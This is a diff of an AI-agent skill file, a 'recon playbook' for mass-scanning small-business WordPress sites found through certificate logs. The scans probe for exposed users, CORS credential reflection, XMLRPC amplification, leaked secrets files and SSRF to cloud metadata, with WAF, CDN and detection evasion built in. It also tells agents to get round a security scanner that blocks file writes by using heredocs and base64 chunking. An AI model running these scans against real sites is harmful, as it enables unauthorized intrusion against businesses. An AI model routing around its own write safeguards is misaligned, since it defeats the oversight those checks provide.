@@ -1,26 +1,25 @@
 ---
 name: recon-playbook
 description: 4-phase pipeline for max findings per minute across batches.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [meta, playbook, pipeline, optimization, workflow]
-    category: meta
-    related_skills:
-      - wp-mass-recon
-      - subdomain-enumeration
-      - sector-recon-methodology
-      - attack-patterns-reference
-      - deep-invade
-      - cors-credential-wordpress
-      - xmlrpc-exploitation
-      - source-leak-hunt
-      - web-enumeration
-      - cross-wave-delta-analysis
+compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
+tags: [meta, playbook, pipeline, optimization, workflow]
+category: meta
+related_skills:
+  - wp-mass-recon
+  - subdomain-enumeration
+  - sector-recon-methodology
+  - attack-patterns-reference
+  - deep-invade
+  - cors-credential-wordpress
+  - xmlrpc-exploitation
+  - source-leak-hunt
+  - web-enumeration
+  - cross-wave-delta-analysis
+  - parallel-recon-triad
 ---
 
 # Recon Playbook Skill
@@ -32,13 +31,14 @@ The master playbook that orchestrates all recon skills in the optimal sequence f
 - Starting a new recon engagement with a target list.
 - You have limited time and need to maximize findings.
 - After `sector-recon-methodology` produces a target list.
-- Training — this is the canonical workflow for agentiko recon.
+- For parallel high-volume authorized engagements, see `parallel-recon-triad`.
+- Training — this is the canonical workflow for automated recon.
 
 ## Prerequisites
 
 - All recon skills loaded: `wp-mass-recon`, `subdomain-enumeration`, `cors-credential-wordpress`, `xmlrpc-exploitation`, `source-leak-hunt`, `deep-invade`.
 - Worker container with all tools available.
-- Target list at `/root/output/targets.txt` (format: `domain|company|sector`).
+- Target list at `$OUTDIR/targets.txt` (format: `domain|company|sector`).
 
 ## How to Run
 
@@ -142,7 +142,7 @@ done < high_value.txt
 # - XMLRPC system.multicall: Very Low (single req = 1000 attempts — the evasion IS the amplification)
 
 # HTTP/1.0 for WP Engine bypass
-curl -sk --http1.0 "https://TARGET/wp-json/wp/v2/users"
+curl --max-time 30 --connect-timeout 10 -sk --http1.0 "https://TARGET/wp-json/wp/v2/users"
 
 # Random 2-4s jitter between targets (wave6 standard)
 sleep $(python3 -c "import random; print(round(random.uniform(2,4),1))")
@@ -153,7 +153,7 @@ sleep $(python3 -c "import random; print(round(random.uniform(2,4),1))")
 ### Phase 0 — Target Generation
 
 ```bash
-OUTDIR="/root/output/playbook"
+OUTDIR="$OUTDIR/playbook"
 mkdir -p "$OUTDIR"
 
 echo "[*] Phase 0: Target Generation"
@@ -167,13 +167,13 @@ for sector in "landscaping" "roofing" "hvac" "pools" "plumbing" "pest-control" \
   "general-contractor" "hvac-repair" "plumbing-services"; do
 
   echo "  Sector: $sector"
-  curl -sk --max-time 15 "https://crt.sh/?q=%25.${sector}%25&output=json" 2>/dev/null | \
+  curl -sk --max-time 15 --connect-timeout 10 "https://crt.sh/?q=%25.${sector}%25&output=json" 2>/dev/null | \
     jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' | sed 's/^www\.//' >> "$OUTDIR/raw_domains.txt"
   sleep 2  # crt.sh rate limit
 done
 
 # Option B: From existing target list
-# cat /root/output/recon_us/new_targets/all_targets.txt | cut -d'|' -f1 > "$OUTDIR/raw_domains.txt"
+# cat $OUTDIR/recon_output/new_targets/all_targets.txt | cut -d'|' -f1 > "$OUTDIR/raw_domains.txt"
 
 # Clean and deduplicate
 cat "$OUTDIR/raw_domains.txt" | \
@@ -186,7 +186,7 @@ echo "[+] $(wc -l < "$OUTDIR/unique_domains.txt") unique domains"
 ### Phase 1 — Quick Filter
 
 ```bash
-OUTDIR="/root/output/playbook"
+OUTDIR="$OUTDIR/playbook"
 
 echo "[*] Phase 1: Quick Filter"
 
@@ -207,7 +207,7 @@ while read -r line; do
   domain=$(echo "$url" | sed 's|https\?://||')
 
   # Quick WP check
-  wp_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$url/wp-login.php" 2>/dev/null)
+  wp_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$url/wp-login.php" 2>/dev/null)
   if [[ "$wp_code" =~ ^(200|301|302|403)$ ]]; then
     echo "$domain" >> "$OUTDIR/wp_manual.txt"
   fi
@@ -228,7 +228,7 @@ echo "[+] $(wc -l < "$OUTDIR/wp_targets.txt") total WP targets for Phase 2"
 Use the `wp-mass-recon` skill for this phase. Quick inline version for the playbook:
 
 ```bash
-OUTDIR="/root/output/playbook"
+OUTDIR="$OUTDIR/playbook"
 FINDINGS="$OUTDIR/phase2_findings"
 mkdir -p "$FINDINGS"
 
@@ -246,28 +246,28 @@ while read -r url; do
     echo ""
 
     # WordPress check
-    wp_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$url/wp-login.php")
+    wp_code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$url/wp-login.php")
     [[ "$wp_code" =~ ^(200|301|302|403)$ ]] && { echo "- WordPress: CONFIRMED"; ((score+=1)); }
 
     # REST users
-    users=$(curl -sk --max-time 5 "$url/wp-json/wp/v2/users" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null || echo 0)
+    users=$(curl -sk --max-time 5 --connect-timeout 5 "$url/wp-json/wp/v2/users" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d) if isinstance(d,list) else 0)" 2>/dev/null || echo 0)
     [[ "$users" -gt 0 ]] && { echo "- Users exposed: $users"; ((score+=$users*2)); }
 
     # CORS
-    cors=$(curl -skI --max-time 5 "$url/wp-json/wp/v2/users" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
+    cors=$(curl -skI --max-time 5 --connect-timeout 5 "$url/wp-json/wp/v2/users" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
     [[ -n "$cors" ]] && { echo "- CORS: CREDENTIAL REFLECTION"; ((score+=3)); }
 
     # XMLRPC
-    xmlrpc_resp=$(curl -sk --max-time 5 -X POST "$url/xmlrpc.php" -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>' 2>/dev/null)
+    xmlrpc_resp=$(curl -sk --max-time 5 --connect-timeout 5 -X POST "$url/xmlrpc.php" -d '<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName></methodCall>' 2>/dev/null)
     [[ "$xmlrpc_resp" == *"Hello"* ]] && { echo "- XMLRPC: OPEN"; ((score+=3)); }
 
     # Open registration
-    reg=$(curl -sk --max-time 5 "$url/wp-login.php?action=register" 2>/dev/null | grep -o 'user_login')
+    reg=$(curl -sk --max-time 5 --connect-timeout 5 "$url/wp-login.php?action=register" 2>/dev/null | grep -o 'user_login')
     [[ -n "$reg" ]] && { echo "- Open Registration: YES"; ((score+=2)); }
 
     # Source leaks (quick check, 5 paths)
     for path in ".env" "wp-config.php.bak" "debug.log" "info.php" "backup.sql"; do
-      leak_code=$(curl -sk -o /tmp/leak_$$.tmp -w "%{http_code}" --max-time 3 "$url/$path")
+      leak_code=$(curl -sk -o /tmp/leak_$$.tmp -w "%{http_code}" --max-time 3 --connect-timeout 3 "$url/$path")
       if [[ "$leak_code" == "200" ]]; then
         content=$(head -c 500 /tmp/leak_$$.tmp)
         if echo "$content" | grep -qiE 'DB_|APP_|_KEY|_SECRET|PHP Version|CREATE TABLE'; then
@@ -287,7 +287,7 @@ while read -r url; do
   [[ $score -ge 6 ]] && echo "$url" >> "$OUTDIR/high_value_targets.txt"
 
   # Limit parallel workers
-  while [[ $(jobs -r | wc -l) -ge 10 ]]; do sleep 0.5; done
+  while [[ $(jobs -r | wc -l) -ge 10 ]]; do sleep 1; done
 
 done < "$OUTDIR/wp_targets.txt" 2>/dev/null
 wait
@@ -303,7 +303,7 @@ Run only on high-value targets (score >= 6). Use `deep-invade` skill.
 
 ### Phase 3.5 — Target Documentation Expansion (3-Doc Suite)
 
-After Deep Invade completes on a high-value target, generate a **3-doc documentation suite** per target in `/root/output/recon_us/<domain>/`. This consolidates ALL findings into a structured deliverable for exploitation and reporting.
+After Deep Invade completes on a high-value target, generate a **3-doc documentation suite** per target in `$OUTDIR/recon_output/<domain>/`. This consolidates ALL findings into a structured deliverable for exploitation and reporting.
 
 **Model-split pattern: Pro writes, Flash dispatches in parallel via delegate_task.**
 
@@ -332,16 +332,16 @@ After Deep Invade completes on a high-value target, generate a **3-doc documenta
 Use `delegate_task(tasks=[...])` to write ATTACK_SURFACE.md and EXPLOIT_CHAINS.md in parallel. Each task must get:
 - target domain, IP, hosting provider
 - ALL known ports, subdomains, paths, CORS data, plugins, tech stack, user tables
-- Explicit file path: `/root/output/recon_us/<domain>/FILENAME.md`
+- Explicit file path: `$OUTDIR/recon_output/<domain>/FILENAME.md`
 - Language directive (PT-BR when Hiago context)
-- Tool instruction: use `terminal cat > heredoc` (write_file blocks /root/output/ paths)
+- Tool instruction: use `terminal cat > heredoc` (write_file blocks $OUTDIR/ paths)
 
 #### Verification
 
 After Phase 3.5, confirm:
 ```bash
 for f in MASTER_REPORT.md ATTACK_SURFACE.md EXPLOIT_CHAINS.md; do
-  path="/root/output/recon_us/<domain>/$f"
+  path="$OUTDIR/recon_output/<domain>/$f"
   if [ -f "$path" ]; then
     echo "OK: $f ($(wc -l < "$path") lines, $(wc -c < "$path") bytes)"
   else
@@ -354,7 +354,7 @@ done
 
 Subagents (Flash) may report "wrote successfully" but the file was never created or still contains old content. Always verify file existence AND size/lines after subagents return. If a subagent claimed success but the file is the old version (same size/lines), do NOT re-dispatch blindly — write the file directly from the orchestrator.
 
-**Also:** Subagents sometimes show `write_file` errors for temp scripts (`/tmp/gen_docs.py`) while the actual doc files were written correctly via terminal heredoc. Don't panic at "Write denied" warnings — check the actual output directory with `ls -la /root/output/recon_us/<domain>/` to determine what actually got written.
+**Also:** Subagents sometimes show `write_file` errors for temp scripts (`/tmp/gen_docs.py`) while the actual doc files were written correctly via terminal heredoc. Don't panic at "Write denied" warnings — check the actual output directory with `ls -la $OUTDIR/recon_output/<domain>/` to determine what actually got written.
 
 **Large file workaround for subagents:** When a subagent reports success but the file is truncated (heredoc size limit ~8KB), use base64 chunking:
 ```bash
@@ -363,11 +363,11 @@ Subagents (Flash) may report "wrote successfully" but the file was never created
 # Or: "Use Python open() via terminal, not write_file tool."
 ```
 
-**Note**: `write_file` tool blocks `/root/output/` paths (Tirith security scanner). Always use terminal `cat > heredoc`. If blocked or heredoc too large (raw IPs like 169.254.169.254, pipe-to-python), write via Python: `terminal("python3 -c \\"...\\"")`. For very large files (>150 lines), use base64 chunking via terminal:
+**Note**: `write_file` tool blocks `$OUTDIR/` paths (Tirith security scanner). Always use terminal `cat > heredoc`. If blocked or heredoc too large (raw IPs like [REDACTED_IP], pipe-to-python), write via Python: `terminal("python3 -c \\"...\\"")`. For very large files (>150 lines), use base64 chunking via terminal:
 
 ```bash
-echo 'BASE64_CHUNK_1' | base64 -d > /root/output/recon_us/<domain>/FILE.md
-echo 'BASE64_CHUNK_2' | base64 -d >> /root/output/recon_us/<domain>/FILE.md
+echo 'BASE64_CHUNK_1' | base64 -d > $OUTDIR/recon_output/<domain>/FILE.md
+echo 'BASE64_CHUNK_2' | base64 -d >> $OUTDIR/recon_output/<domain>/FILE.md
 ```
 
 ### Phase 3.6 — Deep Active Validation (Wave 10+)
@@ -393,7 +393,7 @@ After Phase 3.5 generates the 3-doc suite, dispatch **3 Pro subagents** (one per
 tasks = [
   {"goal": "Deep active probe of target1.com — test ALL vectors, save to deep/wave10_target1.md",
    "context": """Full context: IP, hosting, stack, users, CORS docs, XMLRPC status, all known findings...
-                 Save to /root/output/recon_us/deep/wave10_target1.md with raw curl output.""",
+                 Save to $OUTDIR/recon_output/deep/wave10_target1.md with raw curl output.""",
    "toolsets": ["terminal"]},
   {"goal": "Deep active probe of target2.com...",
    "context": """...""",
@@ -408,13 +408,13 @@ delegate_task(tasks=tasks)
 #### Per-Agent Mandatory Checklist
 
 1. Read ALL existing docs (MASTER_REPORT, ATTACK_SURFACE, EXPLOIT_CHAINS, deep/ findings)
-2. Re-confirm all endpoints — `curl -sk -D-` for HTTP status
+2. Re-confirm all endpoints — `curl --max-time 30 --connect-timeout 10 -sk -D-` for HTTP status
 3. CORS full scan — 10+ endpoints with `Origin: https://evil.com`, verify ACAO+ACAC
 4. XMLRPC listMethods + multicall confirmation (3+ stacked calls)
 5. WordPress users via REST API
-6. Pingback SSRF — 169.254.169.254, 127.0.0.1:80, 127.0.0.1:3306
-7. subfinder -d target.com -silent
-8. nmap -sS -T4 -F target.com
+6. Pingback SSRF — [REDACTED_IP], 127.0.0.1:80, 127.0.0.1:3306
+7. subfinder -d $TARGET -silent
+8. nmap -sS -T4 -F $TARGET
 9. Sensitive files — .env, .git, wp-config.bak, debug.log, backup.sql
 10. ffuf fuzzing with 100+ common paths
 11. JS secrets grep — API keys, S3 buckets, internal URLs
@@ -442,7 +442,7 @@ delegate_task(tasks=tasks)
 
 ```bash
 echo "=== Wave 10 Delta Summary ==="
-for f in /root/output/recon_us/deep/wave10_*.md; do
+for f in $OUTDIR/recon_output/deep/wave10_*.md; do
   echo "--- $(basename $f) ---"
   grep -A5 "New findings:" "$f" 2>/dev/null | head -5
   echo ""
@@ -450,7 +450,7 @@ done
 ```
 
 ```bash
-OUTDIR="/root/output/playbook"
+OUTDIR="$OUTDIR/playbook"
 
 echo "[*] Phase 3: Deep Invade on high-value targets"
 
@@ -480,7 +480,7 @@ if [[ -f "$OUTDIR/high_value_targets.txt" ]]; then
     # (staging commands from deep-invade Phase 5)
 
     echo "  [6/7] Port scan..."
-    nmap -F --open -T4 "$domain" -oN "/root/output/playbook/deep/${domain}_nmap.txt" 2>/dev/null
+    nmap -F --open -T4 "$domain" -oN "$OUTDIR/playbook/deep/${domain}_nmap.txt" 2>/dev/null
 
     echo "  [7/7] API discovery..."
     # (API commands from deep-invade Phase 7)
@@ -493,10 +493,10 @@ fi
 
 ### Phase 4 — Consolidated Sector Report
 
-Generate a consolidated vulnerability report in the proven format (distilled from 58 findings across 28 sectors in US_COMPANIES_VULNS.md). This format groups findings by severity, then by sector for medium findings, and includes direct POC commands.
+Generate a consolidated vulnerability report in the proven format (distilled from 58 findings across 28 sectors in FINDINGS_REPORT.md). This format groups findings by severity, then by sector for medium findings, and includes direct POC commands.
 
 ```bash
-OUTDIR="/root/output/playbook"
+OUTDIR="$OUTDIR/playbook"
 REPORT="$OUTDIR/US_SECTOR_VULNS.md"
 
 # ──────────────────────────────────────
@@ -654,8 +654,8 @@ lines.append("")
 lines.append("```bash")
 for domain in sorted(critical.keys(), key=lambda d: -(targets[d]['score'])):
     lines.append(f"# {domain}")
-    lines.append(f"curl -sk \"https://{domain}/wp-json/wp/v2/users\" | python3 -m json.tool")
-    lines.append(f"curl -sk -H 'Origin: https://evil.com' -I \"https://{domain}/wp-json/wp/v2/users\" | grep -i access-control")
+    lines.append(f"curl --max-time 30 --connect-timeout 10 -sk \"https://{domain}/wp-json/wp/v2/users\" | python3 -m json.tool")
+    lines.append(f"curl --max-time 30 --connect-timeout 10 -sk -H 'Origin: https://evil.com' -I \"https://{domain}/wp-json/wp/v2/users\" | grep -i access-control")
     lines.append("")
 lines.append("```")
 lines.append("")
@@ -704,7 +704,7 @@ The reference file contains weighted criteria, decision flow table, and real exa
 
 ### Per-Target Attack Surface Catalog
 
-After Phase 3 (Deep Invade) is complete on a target, generate a per-target ATTACK_SURFACE.md in `/root/output/recon_us/<domain>/ATTACK_SURFACE.md` using the `references/attack-surface-catalog.md` reference included with this skill. This document consolidates ALL findings (ports, subdomains, HTTP paths, WP REST API, XMLRPC, MyBB, plugins, tracking IDs, server paths, CORS status, enumerated users) into a single structured catalog before exploitation begins.
+After Phase 3 (Deep Invade) is complete on a target, generate a per-target ATTACK_SURFACE.md in `$OUTDIR/recon_output/<domain>/ATTACK_SURFACE.md` using the `references/attack-surface-catalog.md` reference included with this skill. This document consolidates ALL findings (ports, subdomains, HTTP paths, WP REST API, XMLRPC, MyBB, plugins, tracking IDs, server paths, CORS status, enumerated users) into a single structured catalog before exploitation begins.
 
 The per-target catalog feeds into Phase 4's consolidated sector report. Generate it for every high-value target that enters Phase 3.
 
@@ -723,7 +723,7 @@ USER_AGENTS=(
 delay() { sleep $(python3 -c "import random; print(round(random.uniform(2,4),1))"); }
 
 # HTTP/1.0 to bypass some WAFs
-curl -sk --http1.0 "https://$TARGET/path"
+curl --max-time 30 --connect-timeout 10 -sk --http1.0 "https://$TARGET/path"
 
 # Use --resolve to bypass CDN to origin
 # curl -sk --resolve "example.com:443:ORIGIN_IP" "https://example.com/path"
